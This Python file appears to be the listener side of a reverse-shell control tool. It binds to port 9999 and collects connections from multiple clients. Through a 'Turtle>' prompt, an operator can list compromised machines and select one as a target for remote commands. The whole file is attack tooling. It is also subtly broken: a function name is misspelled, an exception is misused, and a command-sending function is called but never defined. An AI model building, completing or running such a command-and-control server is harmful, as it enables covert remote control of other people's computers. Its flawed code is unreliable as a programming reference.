import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []



# Create Socket (allows two computers to connect)

def socket_create():
	try: 
		global host
		global port
		global s

		host =  ''
		port = 9999
		s = socket.socket()

	except socket.error() as msg:
		print("Socket Creating Error: " + str(msg))

# Bind socket to port and wait for connection from client

def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))
		s.listen(5)

	except socket.error as msg:
		print("Socket binding error: " + str(msg))
		time.sleep(5)
		socket_bind()


# Accept connections from multiple clients and save to list

def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]

	while 1:
		try:
			conn, address = s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print("\n Connection has been established: " + address[0])

		except:
			print("Error accepting connections...")

# Interactive prompt for sending commands remotely

def start_turtle():
	while True:
		cmd = input('Turtle> ')
		if cmd == 'list':
			list_connections()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_command(conn)
		else:
			print("Command not recognised")

# Displays all current connections

def list_connections():
	results = ''
	for i, conn in enumurate(all_connections):
		try:
			conn.send(str.encode(''))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue

		results += str(i) + '   ' + str(all_addresses[i][0]) + str(i) + '   ' + str(all_addresses[i][1]) + '\n'

	print('------Clients------' + '\n' + results)

# Select a target client

def get_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn = all_connections[target]
		print("You are now connected to " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '> ', end = "")
		return conn
	except:
		print("Not a valid selection")
		return None